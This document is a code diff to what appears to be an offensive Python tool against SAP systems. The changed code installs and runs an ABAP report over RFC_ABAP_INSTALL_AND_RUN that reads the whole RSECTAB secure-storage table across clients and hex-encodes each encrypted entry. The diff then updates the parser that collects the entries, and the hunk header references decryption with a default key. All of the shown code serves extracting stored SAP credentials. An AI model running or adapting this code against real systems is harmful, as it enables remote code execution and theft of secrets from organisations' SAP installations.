@@ -180,16 +180,37 @@ def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
 # contain the pipe delimiter and break row parsing.  Instead we run a tiny
 # ABAP report via RFC_ABAP_INSTALL_AND_RUN that reads RSECTAB, hex-encodes
 # the DATA field, and writes one line per row as  IDENT~~~hex_DATA .
+# Output per RSECTAB row uses 3 short lines to stay within the WRITES
+# table ZEILE width limit (~256 chars in RFC_ABAP_INSTALL_AND_RUN):
+#   ~~~I <MANDT> <IDENT>        (ident line)
+#   ~~~A <first 184 hex chars>  (hex part 1: bytes 0-91)
+#   ~~~B <rest 184 hex chars>   (hex part 2: bytes 92-183)
 _ABAP_READ_RSECTAB = [
-    "REPORT ZSECSTORE LINE-SIZE 1000.",
+    "REPORT ZSECSTORE LINE-SIZE 500.",
     "TABLES: RSECTAB.",
     "DATA: HEXSTR(368) TYPE C.",
-    "DATA: RAW(184) TYPE X.",
+    "DATA: BYTE TYPE X LENGTH 1.",
+    "DATA: HI TYPE I.",
+    "DATA: LO TYPE I.",
+    "DATA: BIDX TYPE I.",
+    "DATA: HIDX TYPE I.",
     "DATA: CNT TYPE I.",
-    "SELECT * FROM RSECTAB.",
-    "  RAW = RSECTAB-DATA.",
-    "  HEXSTR = RAW.",
-    "  WRITE: / RSECTAB-IDENT, '~~~', HEXSTR.",
+    "DATA: HC(16) TYPE C VALUE '0123456789ABCDEF'.",
+    "SELECT * FROM RSECTAB CLIENT SPECIFIED.",
+    "  CLEAR HEXSTR.",
+    "  DO 184 TIMES.",
+    "    BIDX = SY-INDEX - 1.",
+    "    BYTE = RSECTAB-DATA+BIDX(1).",
+    "    HI = BYTE DIV 16.",
+    "    LO = BYTE MOD 16.",
+    "    HIDX = BIDX * 2.",
+    "    HEXSTR+HIDX(1) = HC+HI(1).",
+    "    HIDX = HIDX + 1.",
+    "    HEXSTR+HIDX(1) = HC+LO(1).",
+    "  ENDDO.",
+    "  WRITE: / '~~~I', RSECTAB-MANDT, RSECTAB-IDENT.",
+    "  WRITE: / '~~~A', HEXSTR(184).",
+    "  WRITE: / '~~~B', HEXSTR+184(184).",
     "  CNT = CNT + 1.",
     "ENDSELECT.",
     "WRITE: / '~~~TOTAL:', CNT.",
@@ -270,18 +291,28 @@ def _read_rsectab_via_abap(node, creds) -> list | None:
                 for i, line in enumerate(output[:3]):
                     print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")
 
+            # Parse 3-line groups: ~~~I (ident), ~~~A (hex part1), ~~~B (hex part2)
             rows = []
+            cur_ident = None
+            cur_hex   = ""
             for line in output:
                 if line.startswith("~~~TOTAL:"):
                     total = line.split(":", 1)[1].strip()
                     print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
                     continue
-                if "~~~" not in line:
-                    continue
-                parts = line.split("~~~", 1)
-                ident    = parts[0].strip()
-                data_hex = parts[1].strip().replace(" ", "").upper()
-                rows.append((ident, data_hex))
+                if line.startswith("~~~I"):
+                    # Flush previous entry
+                    if cur_ident is not None and cur_hex:
+                        rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
+                    cur_ident = line[4:].strip()
+                    cur_hex   = ""
+                elif line.startswith("~~~A"):
+                    cur_hex = line[4:].strip()
+                elif line.startswith("~~~B"):
+                    cur_hex += line[4:].strip()
+            # Flush last entry
+            if cur_ident is not None and cur_hex:
+                rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
             return rows
 
     except Exception as e:
